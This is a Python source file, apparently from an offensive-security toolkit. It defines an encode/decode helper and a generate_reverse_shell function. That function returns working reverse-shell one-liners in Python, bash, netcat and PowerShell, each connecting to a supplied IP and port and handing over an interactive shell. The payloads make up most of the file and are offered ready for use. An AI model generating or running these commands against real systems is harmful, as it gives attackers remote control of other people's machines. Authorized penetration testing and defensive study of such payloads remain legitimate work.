import base64
import urllib.parse
import codecs

async def encode_decode(text: str, method: str) -> str:
    """
    Encodes or decodes text. 
    Methods: 'b64_enc', 'b64_dec', 'url_enc', 'url_dec', 'hex_enc', 'hex_dec', 'rot13'.
    """
    try:
        if method == "b64_enc":
            return base64.b64encode(text.encode()).decode()
        elif method == "b64_dec":
            return base64.b64decode(text).decode()
        elif method == "url_enc":
            return urllib.parse.quote(text)
        elif method == "url_dec":
            return urllib.parse.unquote(text)
        elif method == "hex_enc":
            return text.encode().hex()
        elif method == "hex_dec":
            return bytes.fromhex(text).decode()
        elif method == "rot13":
            return codecs.encode(text, 'rot_13')
        else:
            return f"Unknown method: {method}. Available: b64_enc, b64_dec, url_enc, url_dec, hex_enc, hex_dec, rot13"
    except Exception as e:
        return f"Error processing text: {e}"

async def generate_reverse_shell(ip: str, port: int, language: str) -> str:
    """Generates a reverse shell one-liner for the specified language."""
    shells = {
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "powershell": f"$client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    }
    
    lang = language.lower()
    if lang in shells:
        return shells[lang]
    else:
        return f"Unknown language: {language}. Available: {', '.join(shells.keys())}"
